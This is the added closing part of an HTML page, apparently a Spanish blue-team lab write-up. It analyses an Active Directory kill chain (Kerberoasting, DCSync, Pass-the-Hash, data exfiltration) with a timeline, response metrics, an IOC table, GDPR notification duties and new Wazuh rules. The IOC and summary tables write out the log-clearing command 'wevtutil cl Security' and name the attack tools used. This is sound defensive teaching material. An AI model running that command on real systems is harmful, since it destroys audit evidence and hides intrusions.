+            <tr><td>00:03</td><td>Kerberoasting de svc_sql — 4769 en AOM-AD1</td><td>Atacante</td></tr>
+            <tr><td>00:06</td><td>DCSync — 4662 dispara la regla 100200 (nivel 12)</td><td>Detección</td></tr>
+            <tr><td>00:09</td><td>Pass-the-Hash de paco (4624 NTLM + 4672) — alerta de correlación</td><td>Detección</td></tr>
+            <tr><td>00:12</td><td>El analista correlaciona y <strong>declara incidente CRÍTICO</strong></td><td>SOC</td></tr>
+            <tr><td>00:15</td><td>Acceso a RRHH y exfiltración (SQL Audit) — el atacante consigue los datos</td><td>Atacante</td></tr>
+            <tr><td>00:18</td><td>Borrado del log (1102) — última acción del atacante</td><td>Atacante</td></tr>
+            <tr><td>00:35</td><td>Contención completada: equipos aislados y cuentas cortadas</td><td>Respuesta</td></tr>
+            <tr><td>04:30</td><td>BBDD restaurada desde backup limpio y entorno endurecido</td><td>Recuperación</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Métricas del incidente</h3>
+      <p>Derivadas de la línea de tiempo anterior:</p>
+
+      <div class="stat-row">
+        <div class="stat-card"><span class="stat-val red">~18 min</span><span class="stat-label">Dwell time (ataque)</span></div>
+        <div class="stat-card"><span class="stat-val cyan">~12 min</span><span class="stat-label">MTTD (detección)</span></div>
+        <div class="stat-card"><span class="stat-val red">~35 min</span><span class="stat-label">MTTC (contención)</span></div>
+        <div class="stat-card"><span class="stat-val green">~4 h</span><span class="stat-label">MTTR (recuperación)</span></div>
+      </div>
+
+      <p>
+        El dato que importa: la <strong>detección (12 min) llega antes de que el atacante termine (18 min)</strong>. Con buena telemetría, el SOC entra en juego mientras el incidente aún está en curso — no después. La contención en ~35 min y la recuperación en horas son objetivos razonables para un compromiso de dominio con brecha de datos.
+      </p>
+
+      <h3>Indicadores de compromiso (IOCs)</h3>
+      <table class="ioc-table">
+        <thead><tr><th>Tipo</th><th>Valor</th><th>Contexto</th><th>Severidad</th></tr></thead>
+        <tbody>
+          <tr><td>IP atacante</td><td>192.168.60.100</td><td>Origen de toda la cadena</td><td class="sev-crit">CRÍTICA</td></tr>
+          <tr><td>Cuenta inicial</td><td>fran</td><td>Credenciales filtradas</td><td class="sev-high">ALTA</td></tr>
+          <tr><td>Cuenta de servicio</td><td>svc_sql</td><td>Kerberoasting + DCSync + acceso SQL</td><td class="sev-crit">CRÍTICA</td></tr>
+          <tr><td>Hash NT</td><td>b812e8f0…906637</td><td>paco — Pass-the-Hash</td><td class="sev-crit">CRÍTICA</td></tr>
+          <tr><td>SPN abusado</td><td>MSSQLSvc/SQL01.AOM-SOC.lab:1433</td><td>Objetivo del kerberoasting</td><td class="sev-high">ALTA</td></tr>
+          <tr><td>Ficheros</td><td>rrhh_exfiltrado.csv · query.sql</td><td>Datos robados (en la Kali)</td><td class="sev-crit">CRÍTICA</td></tr>
+          <tr><td>Comando</td><td>wevtutil cl Security</td><td>Borrado de log (1102)</td><td class="sev-high">ALTA</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Notificación a la AEPD <span class="mitre-tag" style="background:rgba(255,159,26,.12);color:#ff9f1a;border-color:rgba(255,159,26,.25)">RGPD art. 33</span></h3>
+      <div class="callout callout-danger">
+        <div class="callout-icon"><i class="fas fa-gavel"></i></div>
+        <div class="callout-content">
+          <strong>Brecha de datos personales — notificación en 72h</strong>
+          <p>Se exfiltraron datos identificativos (nombre, DNI) y económicos (IBAN, salario) de ~1000 empleados. Esto obliga a notificar a la <strong>AEPD</strong> en un máximo de 72h (RGPD art. 33) y, dado el riesgo alto (posible fraude bancario y suplantación), a comunicar a los afectados (art. 34). Se documenta naturaleza, categorías de datos y afectados, posibles consecuencias y medidas adoptadas.</p>
+        </div>
+      </div>
+
+      <h3>Mejora del SOC — ciclo cerrado</h3>
+      <p>
+        Las reglas que nacieron durante el incidente vuelven al catálogo permanente: detección de 4769 contra cuentas de servicio, alerta de logon NTLM de cuentas privilegiadas, y la que faltaba — <strong>4662 de replicación (DCSync)</strong>. Eso es cerrar el bucle PDCA: el incidente te deja mejor preparado para el siguiente.
+      </p>
+    </section>
+
+
+    <!-- ══ CONCLUSIÓN ══ -->
+    <section id="conclusion" class="content-section">
+      <h2><span class="section-number">11</span> Conclusión</h2>
+
+      <p>
+        Las siete alertas no eran incidentes aislados: formaban una única <strong>kill chain</strong>. El acceso de Fran abrió la puerta al kerberoasting; el crackeo dio paso al DCSync; el DCSync entregó a paco; paco permitió el movimiento lateral; y svc_sql, el acceso final a los datos. Detectarlo, correlacionarlo y responderlo bajo un marco es exactamente lo que hace un analista SOC.
+      </p>
+
+      <div class="summary-table" style="overflow-x:auto">
+        <table class="summary-table">
+          <thead><tr><th>Fase del ataque</th><th>Herramienta</th><th>Detectado por (Event ID)</th><th>MITRE ATT&amp;CK</th></tr></thead>
+          <tbody>
+            <tr><td>Kerberoasting</td><td>Impacket GetUserSPNs</td><td>4769 (svc_sql)</td><td>T1558.003</td></tr>
+            <tr><td>Volcado NTDS</td><td>secretsdump (DCSync)</td><td>4662 (replicación)</td><td>T1003.006</td></tr>
+            <tr><td>Movimiento lateral</td><td>NetExec (Pass-the-Hash)</td><td>4624 NTLM + 4672</td><td>T1550.002</td></tr>
+            <tr><td>Acceso a datos</td><td>impacket-mssqlclient</td><td>4624 svc_sql + SQL Audit</td><td>T1213</td></tr>
+            <tr><td>Anti-forense</td><td>wevtutil cl Security</td><td>1102</td><td>T1070.001</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="quote">
+        <p>"Ver una alerta y apagar un servidor no es responder a un incidente. Responder es entender que siete alertas dispersas son un solo atacante, contener sin destruir la evidencia, erradicar la causa raíz —no el síntoma— y cerrar el caso dejando al SOC mejor preparado que antes."</p>
+      </div>
+    </section>
+
+
+    <!-- ══ BIBLIOGRAFÍA ══ -->
+    <section id="biblio" class="content-section">
+      <h2><span class="section-number">12</span> Bibliografía</h2>
+      <div class="bibliography-section">
+        <div class="bibliography-list">
+          <div class="bib-item">
+            <span class="bib-number">[1]</span>
+            <div class="bib-content">
+              <strong>NIST SP 800-61 Rev. 3 — Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile</strong>
+              <a href="https://csrc.nist.gov/pubs/sp/800/61/r3/final" target="_blank" rel="noopener" class="bib-link">csrc.nist.gov <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+          <div class="bib-item">
+            <span class="bib-number">[2]</span>
+            <div class="bib-content">
+              <strong>NIST Cybersecurity Framework (CSF) 2.0</strong>
+              <a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener" class="bib-link">nist.gov/cyberframework <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+          <div class="bib-item">
+            <span class="bib-number">[3]</span>
+            <div class="bib-content">
+              <strong>MITRE ATT&amp;CK for Enterprise</strong>
+              <a href="https://attack.mitre.org/matrices/enterprise/" target="_blank" rel="noopener" class="bib-link">attack.mitre.org <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+          <div class="bib-item">
+            <span class="bib-number">[4]</span>
+            <div class="bib-content">
+              <strong>Wazuh Documentation</strong>
+              <a href="https://documentation.wazuh.com/" target="_blank" rel="noopener" class="bib-link">documentation.wazuh.com <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+          <div class="bib-item">
+            <span class="bib-number">[5]</span>
+            <div class="bib-content">
+              <strong>Impacket — Fortra / SecureAuth</strong>
+              <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener" class="bib-link">github.com/fortra/impacket <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+          <div class="bib-item">
+            <span class="bib-number">[6]</span>
+            <div class="bib-content">
+              <strong>AEPD — Guía para la notificación de brechas de datos personales</strong>
+              <a href="https://www.aepd.es/" target="_blank" rel="noopener" class="bib-link">aepd.es <i class="fas fa-external-link-alt"></i></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- FOOTER ARTÍCULO -->
+    <footer class="article-footer">
+      <div class="footer-tags">
+        <span class="footer-label">Etiquetas:</span>
+        <a href="#" class="footer-tag">Wazuh</a>
+        <a href="#" class="footer-tag">Active Directory</a>
+        <a href="#" class="footer-tag">NIST 800-61 r3</a>
+        <a href="#" class="footer-tag">Kerberoasting</a>
+        <a href="#" class="footer-tag">DCSync</a>
+        <a href="#" class="footer-tag">Pass-the-Hash</a>
+        <a href="#" class="footer-tag">MITRE ATT&amp;CK</a>
+        <a href="#" class="footer-tag">RGPD</a>
+      </div>
+      <div class="share-section">
+        <span class="share-label">Compartir:</span>
+        <div class="share-buttons">
+          <a href="#" class="share-btn twitter"><i class="fab fa-twitter"></i></a>
+          <a href="#" class="share-btn linkedin"><i class="fab fa-linkedin-in"></i></a>
+          <button class="share-btn copy" onclick="copyLink()"><i class="fas fa-link"></i></button>
+        </div>
+      </div>
+      <div class="author-card">
+        <div class="author-avatar-lg">AO</div>
+        <div class="author-info-lg">
+          <h4>Alejandro Orcajada</h4>
+          <p>Ciberseguridad · Blue Team · NSM. Documentando labs técnicos reales en el camino hacia la seguridad informática profesional.</p>
+          <div class="author-links">
+            <a href="https://github.com/tuusuario" target="_blank" rel="noopener"><i class="fab fa-github"></i></a>
+            <a href="https://linkedin.com/in/tuusuario" target="_blank" rel="noopener"><i class="fab fa-linkedin-in"></i></a>
+          </div>
+        </div>
+      </div>
+      <div class="article-nav">
+        <a href="blog.html" class="nav-prev">
+          <div class="nav-label"><i class="fas fa-arrow-left"></i> Volver al blog</div>
+          <div class="nav-title">Ver todos los laboratorios</div>
+        </a>
+      </div>
+    </footer>
+
+  </article>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-content">
+    <div class="footer-brand">
+      <span class="logo-text">AO</span>
+      <p>Ciberseguridad · Blue Team</p>
+    </div>
+    <div class="footer-links">
+      <a href="index.html">Inicio</a>
+      <a href="blog.html">Blog</a>
+    </div>
+    <div class="footer-social">
+      <a href="https://github.com/tuusuario" target="_blank" rel="noopener"><i class="fab fa-github"></i></a>
+      <a href="https://linkedin.com/in/tuusuario" target="_blank" rel="noopener"><i class="fab fa-linkedin-in"></i></a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <p>© 2026 Alejandro Orcajada</p>
+  </div>
+</footer>
+
+<button class="back-to-top" id="back-to-top" aria-label="Volver arriba">
+  <i class="fas fa-arrow-up"></i>
+</button>
+
+<script>
+  /* Reading progress */
+  window.addEventListener('scroll', () => {
+    const d = document.documentElement.scrollHeight - window.innerHeight;
+    document.getElementById('reading-progress').style.width = (window.scrollY / d * 100) + '%';
+  });
+
+  /* Navbar scroll */
+  window.addEventListener('scroll', () => {
+    document.querySelector('.navbar').classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  /* Back to top */
+  const btt = document.getElementById('back-to-top');
+  window.addEventListener('scroll', () => btt.classList.toggle('visible', window.scrollY > 500));
+  btt.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+  /* Spotlight */
+  document.addEventListener('mousemove', e => {
+    document.getElementById('spotlight').style.background =
+      `radial-gradient(800px at ${e.clientX}px ${e.clientY}px, rgba(0,255,170,0.04), transparent 60%)`;
+  });
+
+  /* TOC */
+  const sections = document.querySelectorAll('.content-section');
+  const tocLinks = document.querySelectorAll('.toc-link');
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(l => {
+          l.classList.remove('active');
+          if (l.getAttribute('href') === '#' + e.target.id) l.classList.add('active');
+        });
+      }
+    });
+  }, { rootMargin: '-20% 0px -80% 0px' });
+  sections.forEach(s => obs.observe(s));
+  tocLinks.forEach(l => {
+    l.addEventListener('click', e => {
+      e.preventDefault();
+      const t = document.querySelector(l.getAttribute('href'));
+      if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+  window.addEventListener('scroll', () => {
+    const h = document.documentElement.scrollHeight - window.innerHeight;
+    const bar = document.getElementById('toc-bar');
+    if (bar) bar.style.height = (window.scrollY / h * 100) + '%';
+  });
+
+  /* Copy code */
+  function copyCode(btn) {
+    const code = btn.parentElement.nextElementSibling.textContent;
+    navigator.clipboard.writeText(code).then(() => {
+      btn.innerHTML = '<i class="fas fa-check"></i> Copiado';
+      setTimeout(() => { btn.innerHTML = '<i class="fas fa-copy"></i> Copiar'; }, 2000);
+    });
+  }
+
+  /* Copy link */
+  function copyLink() {
+    navigator.clipboard.writeText(window.location.href);
+  }
+
+  /* Expandible code */
+  function toggleCode(id, btn) {
+    const wrap = document.getElementById(id);
+    wrap.classList.toggle('expanded');
+    const exp = wrap.classList.contains('expanded');
+    btn.innerHTML = '<i class="fas fa-chevron-' + (exp ? 'up' : 'down') + '"></i> ' + (exp ? 'Colapsar' : 'Ver código completo');
+    btn.classList.toggle('open', exp);
+     if (!exp) wrap.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+
+  /* Lightbox */
+  (function(){
+    const overlay = document.getElementById('lb-overlay');
+    const lbImg = document.getElementById('lb-img');
+    const lbCap = document.getElementById('lb-caption');
+    const btnClose = document.getElementById('lb-close');
+    const btnPrev = document.getElementById('lb-prev');
+    const btnNext = document.getElementById('lb-next');
+    let imgs = [], cur = 0;
+
+    function open(i) {
+      cur = i;
+      lbImg.src = imgs[cur].src;
+      lbImg.alt = imgs[cur].alt;
+      lbCap.textContent = imgs[cur].alt || '';
+      overlay.classList.add('lb-open');
+      document.body.style.overflow = 'hidden';
+      btnPrev.style.opacity = cur > 0 ? '1' : '0.2';
+      btnNext.style.opacity = cur < imgs.length-1 ? '1' : '0.2';
+    }
+    function close() {
+      overlay.classList.remove('lb-open');
+      document.body.style.overflow = '';
+    }
+
+    document.querySelectorAll('img.img-lab').forEach((img, i) => {
+      imgs.push(img);
+      img.addEventListener('click', () => open(i));
+    });
+
+    btnClose.addEventListener('click', close);
+    btnPrev.addEventListener('click', () => { if(cur > 0) open(cur-1); });
+    btnNext.addEventListener('click', () => { if(cur < imgs.length-1) open(cur+1); });
+    overlay.addEventListener('click', e => { if(e.target === overlay) close(); });
+    document.addEventListener('keydown', e => {
+      if (!overlay.classList.contains('lb-open')) return;
+      if (e.key === 'Escape') close();
+      if (e.key === 'ArrowLeft' && cur > 0) open(cur-1);
+      if (e.key === 'ArrowRight' && cur < imgs.length-1) open(cur+1);
+    });
+  })();
+</script>
+</body>
+</html>
